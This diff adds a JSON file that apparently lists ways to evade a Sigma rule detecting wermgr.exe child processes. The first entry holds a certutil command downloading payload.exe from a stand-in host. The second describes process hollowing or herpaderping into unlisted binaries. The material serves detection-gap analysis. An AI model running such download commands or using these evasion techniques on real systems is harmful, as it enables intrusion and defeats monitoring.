@@ -1,0 +1,10 @@
+[
+  {
+    "output": "certutil.exe -urlcache -split -f http://example.com/payload.exe C:\\temp\\payload.exe",
+    "explanation": "The Sigma rule relies on a rigid blocklist of target child executables (e.g., cmd.exe, powershell.exe, rundll32.exe). If an attacker utilizes process hollowing or injection to force wermgr.exe to spawn a different Living off the Land Binary (LOLBin) that is not explicitly listed in the 'selection' criteria, such as certutil.exe, wmic.exe, or msbuild.exe, the process creation event will be ignored by this rule."
+  },
+  {
+    "output": "wermgr.exe -> [Process Herpaderping / Hollow into non-listed binary]",
+    "explanation": "If the attacker uses wermgr.exe to spawn a legitimate Windows binary not in the 'selection' list (e.g., 'notepad.exe' or 'calc.exe') and then uses techniques like Process Hollowing or Process Herpaderping to replace its memory with malicious code, the Sigma rule will not trigger because the 'Image' field reflects a binary not covered by the rule's specific detection list."
+  }
+]
